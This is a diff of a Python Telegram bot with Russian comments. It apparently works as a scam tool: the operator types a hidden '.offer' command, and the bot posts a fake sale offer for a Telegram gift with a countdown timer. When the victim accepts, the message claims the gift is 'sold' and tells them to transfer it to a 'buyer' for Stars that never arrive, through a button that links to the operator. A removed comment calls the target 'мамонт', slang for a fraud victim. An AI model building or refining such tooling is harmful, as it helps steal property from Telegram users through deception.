@@ -20,6 +20,11 @@ CLOCK_EMOJI = '<tg-emoji emoji-id="5280985696880987202">⏱</tg-emoji>'
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# --- ХРАНИЛИЩЕ ДАННЫХ ОФФЕРОВ ---
+# Сюда мы записываем данные по message_id, чтобы потом знать, что менять
+# Формат: {message_id: {"link": "...", "name": "...", "price": "...", "target": "..."}}
+active_offers = {}
+
 # --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
 app = Flask(__name__)
 
@@ -38,7 +43,8 @@ def parse_gift_name(url: str) -> str:
         return unquote(path.split("/")[-1]).replace("+", " ")
     return "Подарок"
 
-def build_offer_text(gift_name, price, gift_url, expires_at, target_user):
+# Текст оффера ДО принятия
+def build_offer_text(gift_name, price, gift_url, expires_at):
     remaining = expires_at - datetime.now()
     total_sec = max(0, int(remaining.total_seconds()))
     hours = total_sec // 3600
@@ -52,6 +58,16 @@ def build_offer_text(gift_name, price, gift_url, expires_at, target_user):
         f"{CLOCK_EMOJI} Предложение действует ещё <b>{hours} ч. {minutes} мин.</b>"
     )
 
+# Текст оффера ПОСЛЕ принятия (КАК НА 2-М СКРИНШОТЕ)
+# Ссылка остается в тексте, чтобы Telegram не убрал карточку сверху
+def build_success_text(gift_name, price, gift_url, target_user):
+    clickable_link = f'<a href="{gift_url}">{gift_name}</a>'
+    
+    return (
+        f"{GIFT_EMOJI} Подарок: {clickable_link} успешно продан!\n\n"
+        f"• Передайте подарок покупателю {target_user} для зачисления {price} {STAR}."
+    )
+
 def offer_keyboard():
     kb = types.InlineKeyboardMarkup()
     kb.row(
@@ -60,143 +76,123 @@ def offer_keyboard():
     )
     return kb
 
-# --- УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ---
+# --- УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК (.offer) ---
 @bot.message_handler(func=lambda message: True, content_types=['text'])
 def handle_all_messages(message):
-    # Проверяем, что пишет админ (чтобы мамонт не мог использовать бота)
     if message.from_user.id != ADMIN_ID:
         return
 
     text = message.text.strip()
     
-    # --- ПРОВЕРКА /start ---
-    if text == '/start':
-        bot.send_message(message.chat.id, "Бот работает. Пиши /offer ссылка цена @юзер")
-        return
-
-    # --- ПРОВЕРКА /offer ---
-    if text.startswith('/offer'):
+    if text.startswith('.offer'):
         parts = text.split()
         if len(parts) < 4:
-            bot.reply_to(message, "❌ Формат: /offer ссылка цена @юзер")
+            try: bot.delete_message(message.chat.id, message.message_id)
+            except: pass
+            bot.send_message(message.chat.id, "❌ Формат: .offer ссылка цена @юзер")
             return
 
         gift_link = parts[1]
         try:
             price = int(parts[2])
         except ValueError:
-            bot.reply_to(message, "❌ Цена должна быть числом")
+            try: bot.delete_message(message.chat.id, message.message_id)
+            except: pass
+            bot.send_message(message.chat.id, "❌ Цена должна быть числом")
             return
         target = parts[3]
 
         gift_name = parse_gift_name(gift_link)
         expires_at = datetime.now() + timedelta(hours=6)
-        offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
+        offer_text = build_offer_text(gift_name, price, gift_link, expires_at)
         kb = offer_keyboard()
 
-        # Отправляем сообщение (если это бизнес-чат, бот сам подхватит connection_id)
+        # Отправляем сообщение и запоминаем его
         try:
-            bot.send_message(
+            sent_msg = bot.send_message(
                 chat_id=message.chat.id,
                 text=offer_text,
                 parse_mode="HTML",
                 reply_markup=kb,
                 disable_web_page_preview=False
             )
+            
+            # Сохраняем данные в память (чтобы потом поменять текст)
+            active_offers[sent_msg.message_id] = {
+                "link": gift_link,
+                "name": gift_name,
+                "price": price,
+                "target": target
+            }
+            
         except Exception as e:
-            bot.reply_to(message, f"Ошибка: {e}")
+            print(f"Ошибка отправки: {e}")
             return
 
-        # Удаляем команду /offer из чата
+        # Удаляем команду .offer
         try:
             bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
         except:
             pass
 
-# --- ИНЛАЙН РЕЖИМ ---
-@bot.inline_handler(lambda query: len(query.query.strip()) > 0)
-def inline_offer(query):
-    text = query.query.strip()
-    parts = text.split()
-    
-    if len(parts) < 3:
-        result = types.InlineQueryResultArticle(
-            id="error_format",
-            title="❌ Неверный формат",
-            description="Введите: ссылка цена @username",
-            input_message_content=types.InputTextMessageContent(
-                message_text="Формат: <ссылка> <цена> <@username>",
-                parse_mode="HTML"
-            )
-        )
-        bot.answer_inline_query(query.id, [result], cache_time=0)
-        return
-
-    gift_link = parts[0]
-    try:
-        price = int(parts[1])
-    except ValueError:
-        result = types.InlineQueryResultArticle(
-            id="error_price",
-            title="❌ Цена должна быть числом",
-            description="Пример: 1500",
-            input_message_content=types.InputTextMessageContent(
-                message_text="Ошибка: цена должна быть числом."
-            )
-        )
-        bot.answer_inline_query(query.id, [result], cache_time=0)
-        return
-    
-    target = parts[2] if len(parts) > 2 else "Получатель"
-    gift_name = parse_gift_name(gift_link)
-    expires_at = datetime.now() + timedelta(hours=6)
-    offer_text = build_offer_text(gift_name, price, gift_link, expires_at, target)
-    kb = offer_keyboard()
-
-    result = types.InlineQueryResultArticle(
-        id=f"offer_{int(time.time())}",
-        title=f"🎁 Создать оффер для {target}",
-        description=f"{gift_name} за {price} ⭐",
-        input_message_content=types.InputTextMessageContent(
-            message_text=offer_text,
-            parse_mode="HTML",
-            disable_web_page_preview=False
-        ),
-        reply_markup=kb
-    )
-    
-    bot.answer_inline_query(query.id, [result], cache_time=0)
-
 # --- ОБРАБОТКА КНОПОК ---
 @bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer"])
 def on_callback(call):
-    # Пытаемся достать business_connection_id (если это бизнес-чат)
     conn_id = getattr(call.message, 'business_connection_id', None)
+    msg_id = call.message.message_id
 
     if call.data == "accept_offer":
         bot.answer_callback_query(call.id, "Оффер принят")
         
-        kb = types.InlineKeyboardMarkup()
-        kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))
-        success_text = f"{GIFT_EMOJI} <b>Подарок успешно продан!</b>\n\n• Передайте подарок покупателю для зачисления Stars."
-        
+        # Достаем данные из памяти
+        if msg_id in active_offers:
+            data = active_offers[msg_id]
+            
+            # Формируем новый текст с ссылкой внутри
+            success_text = build_success_text(
+                data["name"], 
+                data["price"], 
+                data["link"], 
+                data["target"]
+            )
+            
+            # Кнопка "Передать"
+            kb = types.InlineKeyboardMarkup()
+            kb.add(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))
+
+            try:
+                bot.edit_message_text(
+                    chat_id=call.message.chat.id,
+                    message_id=msg_id,
+                    text=success_text,
+                    parse_mode="HTML",
+                    reply_markup=kb,
+                    disable_web_page_preview=False, # Оставляем превью (карточку)
+                    business_connection_id=conn_id
+                )
+            except Exception as e:
+                print(f"Ошибка редактирования: {e}")
+                
+            # Удаляем из памяти, так как оффер уже обработан
+            del active_offers[msg_id]
+        else:
+            bot.answer_callback_query(call.id, "Оффер устарел", show_alert=True)
+            
+    else:
+        bot.answer_callback_query(call.id, "Оффер отклонён")
         try:
             bot.edit_message_text(
                 chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=success_text,
-                parse_mode="HTML",
-                reply_markup=kb,
-                disable_web_page_preview=False,
+                message_id=msg_id,
+                text="❌ Вы отклонили предложение.",
+                reply_markup=None,
                 business_connection_id=conn_id
             )
-        except Exception as e:
-            print(f"Ошибка при редактировании: {e}")
-    else:
-        bot.answer_callback_query(call.id, "Оффер отклонён")
+        except:
+            pass
 
 # --- ЗАПУСК ---
 if __name__ == "__main__":
     threading.Thread(target=run_flask, daemon=True).start()
-    print("Бот и веб-сервер запущены!")
+    print("Бот запущен! Триггер: .offer")
     bot.infinity_polling(timeout=40, long_polling_timeout=30)
